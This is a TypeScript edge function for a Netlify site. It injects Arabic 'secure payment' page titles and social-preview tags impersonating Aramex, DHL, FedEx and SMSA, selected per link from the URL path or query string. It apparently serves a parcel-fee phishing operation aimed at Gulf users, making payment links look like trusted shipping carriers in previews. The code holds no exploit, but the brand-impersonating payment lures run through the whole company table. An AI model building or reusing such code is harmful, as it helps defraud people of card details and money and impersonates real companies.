import { Context } from "https://edge.netlify.com";

/**
 * Senior Cloud Engineer Audit:
 * 1. Added Global Try/Catch wrapper.
 * 2. Removed any potential Node.js API usage.
 * 3. Added robust fallbacks for environment variables and parameters.
 * 4. Ensured no unhandled exceptions during HTML processing.
 */

const GITHUB_CDN = 'https://raw.githubusercontent.com/you3333ef/Youssef-Dafa/main/public';

interface MetaData {
  title: string;
  description: string;
  image: string;
}

const companyMeta: Record<string, MetaData> = {
  aramex: {
    title: "دفع آمن - أرامكس للشحن السريع 🚚",
    description: "خدمات شحن عالمية مع أرامكس - أكمل عملية الدفع بأمان تام للحصول على خدمات شحن سريعة وموثوقة ✅",
    image: "/og-aramex.jpg"
  },
  dhl: {
    title: "دفع آمن - DHL الشحن العالمي السريع ⚡",
    description: "DHL - الشبكة العالمية الأكبر للشحن السريع - أكمل دفعتك بأمان للحصول على خدمات توصيل سريعة وموثوقة 🌍",
    image: "/og-dhl.jpg"
  },
  fedex: {
    title: "دفع آمن - FedEx الشحن الدولي الموثوق 📦",
    description: "FedEx - رائدة الشحن الدولي - ادفع بأمان واحصل على خدمات شحن موثوقة مع تتبع فوري ⏰",
    image: "/og-fedex.jpg"
  },
  smsa: {
    title: "دفع آمن - SMSA Express سمسا إكسبرس 🚛",
    description: "SMSA Express - الرائدة في الشحن السعودي - أكمل الدفع بأمان للحصول على خدمات توصيل سريعة 🇸🇦",
    image: "/og-smsa.jpg"
  },
  default: {
    title: "منصة الدفع الذكية - خدمات دفع آمنة لدول الخليج 💳",
    description: "منصة متكاملة لخدمات الدفع الإلكتروني في دول الخليج - شحن، فواتير، عقود، خدمات حكومية وصحية بأمان",
    image: "/og-aramex.jpg"
  }
};

export default async (request: Request, context: Context) => {
  try {
    return await handleRequest(request, context);
  } catch (error) {
    // Structured logging for production debugging
    console.error(`[EDGE_ERROR] [${new Date().toISOString()}] Uncaught Exception:`, {
      message: error instanceof Error ? error.message : String(error),
      url: request.url,
      stack: error instanceof Error ? error.stack : undefined
    });

    // CRITICAL: Always return a valid response to prevent "uncaught exception" crash
    try {
      return await context.next();
    } catch (fallbackError) {
      return new Response("Internal Server Error", { status: 500 });
    }
  }
};

async function handleRequest(request: Request, context: Context): Promise<Response> {
  const url = new URL(request.url);
  
  // Execution: Get the original response
  const response = await context.next();
  
  // Safety Check: Only intercept successful HTML responses
  const contentType = response.headers.get("content-type") || "";
  if (!response.ok || !contentType.includes("text/html")) {
    return response;
  }

  // Safety Check: Avoid reading massive files that could exceed memory limits
  let html = "";
  try {
    html = await response.text();
  } catch (readError) {
    console.warn("[EDGE_WARN] Failed to read response body:", readError);
    return response;
  }

  // Logic: Determine entity identity
  const pathParts = url.pathname.split('/').filter(Boolean);
  let companyKey = "default";
  
  // Support for /p/:id/:company/... pattern
  if (pathParts[0] === 'p' && pathParts.length >= 3) {
    companyKey = pathParts[2].toLowerCase();
  } else {
    // Fallback to query parameters
    const queryCompany = url.searchParams.get("company") || 
                         url.searchParams.get("c") || 
                         url.searchParams.get("service") || 
                         "default";
    companyKey = queryCompany.toLowerCase();
  }

  const meta = companyMeta[companyKey] || companyMeta.default;
  const fullImageUrl = `${GITHUB_CDN}${meta.image}`;

  // Injection: Build optimized OG tags
  const ogTags = `
    <!-- Senior Injected Meta Tags -->
    <title>${meta.title}</title>
    <meta name="description" content="${meta.description}"/>
    <meta property="og:title" content="${meta.title}"/>
    <meta property="og:description" content="${meta.description}"/>
    <meta property="og:image" content="${fullImageUrl}"/>
    <meta property="og:image:width" content="1200"/>
    <meta property="og:image:height" content="630"/>
    <meta property="og:type" content="website"/>
    <meta property="og:url" content="${url.href}"/>
    <meta name="twitter:card" content="summary_large_image"/>
    <meta name="twitter:title" content="${meta.title}"/>
    <meta name="twitter:description" content="${meta.description}"/>
    <meta name="twitter:image" content="${fullImageUrl}"/>
  `.trim();

  // Strategy: Inject after <head> to override default tags without complex regex
  const modifiedHtml = html.replace(/<head[^>]*>/i, (match) => `${match}\n    ${ogTags}`);

  // Response: Return with clean headers and no-cache for crawlers
  return new Response(modifiedHtml, {
    status: response.status,
    headers: {
      ...Object.fromEntries(response.headers),
      "content-type": "text/html; charset=utf-8",
      "cache-control": "no-cache, no-store, must-revalidate",
      "x-edge-handler": "dynamic-meta-senior"
    }
  });
}
